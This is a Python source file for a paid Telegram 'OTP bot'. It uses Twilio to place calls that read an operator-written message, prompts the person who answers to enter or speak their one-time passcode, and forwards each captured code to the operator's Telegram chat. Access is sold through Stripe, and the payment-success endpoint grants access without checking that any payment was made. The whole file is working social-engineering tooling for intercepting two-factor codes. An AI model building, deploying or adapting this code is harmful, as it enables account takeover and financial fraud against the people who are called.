import os
import asyncio
import requests
from datetime import datetime, timedelta, timezone
from flask import Flask, request, Response
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather
import stripe

# -------------------------
# Environment variables (Render)
# -------------------------
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN")
NGROK_URL = os.environ.get("NGROK_URL", "https://your-app.onrender.com")  # Your Render app URL
TWILIO_ACCOUNT_SID = os.environ.get("TWILIO_ACCOUNT_SID", "YOUR_TWILIO_SID")
TWILIO_AUTH_TOKEN = os.environ.get("TWILIO_AUTH_TOKEN", "YOUR_TWILIO_TOKEN")
TWILIO_PHONE_NUMBER = os.environ.get("TWILIO_PHONE_NUMBER", "+10000000000")
STRIPE_SECRET_KEY = os.environ.get("STRIPE_SECRET_KEY", "YOUR_STRIPE_SECRET")

# Initialize clients
twilio_client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)
stripe.api_key = STRIPE_SECRET_KEY

# -------------------------
# State storage
# -------------------------
user_phone = {}          # Telegram user -> phone
phone_to_chat = {}       # phone -> chat ID
captured_otp = {}        # phone -> OTP
last_message = {}        # Telegram user -> last message
paid_users = {}          # user_id -> paid_until datetime

# -------------------------
# Helpers
# -------------------------
def is_paid(user_id):
    return user_id in paid_users and datetime.now(timezone.utc) < paid_users[user_id]

def get_main_keyboard(user_id):
    keyboard = [
        [InlineKeyboardButton("📱 Set Phone", callback_data="setphone")],
        [InlineKeyboardButton("ℹ️ Help / Usage", callback_data="help")]
    ]
    if not is_paid(user_id):
        keyboard.insert(1, [InlineKeyboardButton("💳 Pay $25 / 4 Days", callback_data="pay")])
    if user_id in user_phone:
        keyboard[0].append(InlineKeyboardButton("📞 Make Call", callback_data="call"))
    return InlineKeyboardMarkup(keyboard)

def create_checkout_session(user_id, customer_email=None):
    session = stripe.checkout.Session.create(
        payment_method_types=["card"],
        line_items=[{
            "price_data": {
                "currency": "usd",
                "product_data": {"name": "4-Day Survivor Access"},
                "unit_amount": 2500,
            },
            "quantity": 1,
        }],
        mode="payment",
        customer_email=customer_email,
        success_url=f"{NGROK_URL}/success?user_id={user_id}",
        cancel_url=f"{NGROK_URL}/cancel"
    )
    return session.url

# -------------------------
# Telegram handlers
# -------------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Welcome to Yoda's OTP Bot!\n\nUse the buttons below:",
        reply_markup=get_main_keyboard(update.effective_user.id)
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.callback_query:
        await update.callback_query.answer()
        chat_id = update.callback_query.message.chat.id
    else:
        chat_id = update.effective_chat.id
    await context.bot.send_message(
        chat_id=chat_id,
        text="ℹ️ *How to use this bot:*\n"
             "1. Tap *📱 Set Phone* to save your number.\n"
             "2. Tap *📞 Make Call* and enter your custom message.\n"
             "3. The bot will call you and capture the OTP.\n"
             "4. You’ll get the OTP back in this chat ✅",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard(update.effective_user.id)
    )

async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id

    if query.data == "pay":
        checkout_url = create_checkout_session(user_id=uid)
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"💳 Complete payment here: {checkout_url}")
        return

    if query.data in ["setphone", "call"] and not is_paid(uid):
        await context.bot.send_message(chat_id=update.effective_chat.id, text="💰 You must pay $25 for 4 days to use this feature.")
        return

    if query.data == "setphone":
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back to Menu", callback_data="menu")]])
        await query.edit_message_text("📱 Please send your phone number (+1XXXXXXXXXX):", parse_mode="Markdown", reply_markup=keyboard)
        context.user_data["awaiting_phone"] = True

    elif query.data == "call":
        if uid not in user_phone:
            await query.edit_message_text("⚠️ Please set your phone first with 📱 Set Phone.", reply_markup=get_main_keyboard(uid))
        else:
            keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back to Menu", callback_data="menu")]])
            await query.edit_message_text("📞 Send your custom message for the call or type /call to reuse your last message.", reply_markup=keyboard)
            context.user_data["awaiting_message"] = True

    elif query.data == "help":
        await help_command(update, context)

    elif query.data == "menu":
        await query.edit_message_text("Main Menu:", reply_markup=get_main_keyboard(uid))

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text.strip()

    if not is_paid(uid):
        await update.message.reply_text("💰 You must pay $25 for 4 days to use this feature.")
        return

    if context.user_data.get("awaiting_phone"):
        user_phone[uid] = text
        phone_to_chat[text] = update.effective_chat.id
        context.user_data["awaiting_phone"] = False
        await update.message.reply_text(f"✅ Phone saved: {text}", reply_markup=get_main_keyboard(uid))
        return

    if context.user_data.get("awaiting_message"):
        last_message[uid] = text
        context.user_data["awaiting_message"] = False
        phone = user_phone[uid]
        twilio_client.calls.create(
            to=phone,
            from_=TWILIO_PHONE_NUMBER,
            url=f"{NGROK_URL}/voice?msg={requests.utils.quote(text)}",
            status_callback=f"{NGROK_URL}/call_status",
            status_callback_event=['initiated','ringing','answered','completed','no-answer'],
            status_callback_method='POST'
        )
        await update.message.reply_text(f"📞 Calling {phone} now with your message...")
        return

    if text == "/call":
        if uid not in last_message or uid not in user_phone:
            await update.message.reply_text("⚠️ Set phone or send a message first.")
            return
        phone = user_phone[uid]
        twilio_client.calls.create(
            to=phone,
            from_=TWILIO_PHONE_NUMBER,
            url=f"{NGROK_URL}/voice?msg={requests.utils.quote(last_message[uid])}",
            status_callback=f"{NGROK_URL}/call_status",
            status_callback_event=['initiated','ringing','answered','completed','no-answer'],
            status_callback_method='POST'
        )
        await update.message.reply_text(f"📞 Re-calling {phone} with your last message...")

# -------------------------
# Flask server
# -------------------------
flask_app = Flask(__name__)
app_telegram = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
app_telegram.add_handler(CommandHandler("start", start))
app_telegram.add_handler(CallbackQueryHandler(handle_buttons))
app_telegram.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

@flask_app.route(f"/{TELEGRAM_TOKEN}", methods=["POST"])
def telegram_webhook():
    update = Update.de_json(request.get_json(force=True), app_telegram.bot)
    asyncio.run(app_telegram.process_update(update))
    return "OK"

@flask_app.route("/voice", methods=["POST", "GET"])
def voice():
    message = request.args.get("msg", "Please enter your OTP now.")
    resp = VoiceResponse()
    gather = Gather(input="dtmf speech", timeout=10, num_digits=6, action="/capture", method="POST")
    gather.say(message)
    gather.say("Please enter or speak your OTP.")
    resp.append(gather)
    resp.say("No input received. Goodbye!")
    return Response(str(resp), mimetype="text/xml")

@flask_app.route("/capture", methods=["POST"])
def capture():
    otp = request.values.get("Digits") or request.values.get("SpeechResult")
    phone = request.values.get("To") or request.values.get("From")
    captured_otp[phone] = otp

    chat_id = phone_to_chat.get(phone)
    if chat_id:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", data={"chat_id": chat_id, "text": f"📩 Captured OTP: {otp}"})

    resp = VoiceResponse()
    resp.say("Thanks! OTP captured. Goodbye!")
    return Response(str(resp), mimetype="text/xml")

@flask_app.route("/call_status", methods=["POST"])
def call_status():
    call_status_val = request.values.get("CallStatus")
    to_number = request.values.get("To")
    chat_id = phone_to_chat.get(to_number)
    if chat_id:
        status_map = {
            "initiated":"📞 Call initiated",
            "ringing":"📲 Ringing",
            "answered":"✅ Answered",
            "completed":"📴 Completed",
            "no-answer":"❌ No answer"
        }
        msg = status_map.get(call_status_val, f"ℹ️ Status: {call_status_val}")
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", data={"chat_id": chat_id, "text": msg})
    return ("", 204)

@flask_app.route("/success")
def payment_success():
    user_id = int(request.args.get("user_id", 0))
    paid_users[user_id] = datetime.now(timezone.utc) + timedelta(days=4)
    return f"✅ Payment received! Access granted for 4 days."

@flask_app.route("/cancel")
def payment_cancel():
    return "Payment canceled. You do not have access."

# -------------------------
# Run Flask (Render will assign PORT)
# -------------------------
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    flask_app.run(host="0.0.0.0", port=port)
